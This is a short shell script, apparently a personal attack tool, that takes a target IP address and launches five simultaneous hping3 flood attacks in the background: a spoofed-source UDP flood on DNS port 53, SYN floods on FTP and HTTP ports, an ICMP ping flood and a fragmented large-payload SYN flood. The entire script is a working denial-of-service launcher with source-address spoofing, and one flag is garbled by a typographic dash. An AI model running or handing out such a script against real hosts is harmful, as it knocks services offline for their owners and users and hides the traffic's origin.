#!/bin/sh
# Christopher Gray
# Version 0.1.14
#  10-31-18

if [ -z "$1" ]
then
      echo "No dest defined to attack! please define one before continuing \r\n"
      exit
else
      server_ip=$1
      echo "Server is set to $server_ip \r\n"
fi


#-----------------------------------------------------------------------------------------------------------------
# Hping3 Attacks
echo "Running HPing3 DNS flood attack script, toward port 53, from random sources... \r\n "
sudo hping3 --flood --rand-source --udp -p 53 $server_ip 2> /dev/null &

echo "Running HPing3 attack script towards FTP... \r\n"
sudo hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source $server_ip 2> /dev/null &

echo "Running HPing3 flood attack to HTTP \r\n "
sudo hping3 $server_ip -p 80 –SF --flood 2> /dev/null &

echo "Running ping flood attack from random sources \r\n"
sudo hping3 $server_ip --icmp --flood --rand-source 2> /dev/null &

echo "Running syn flood attack from random sources, towards a webserver \r\n "
sudo hping3 --syn --flood --rand-source --win 65535 --ttl 64 --data 16000 --morefrag --baseport 49877 --destport 80 $server_ip 2> /dev/null &
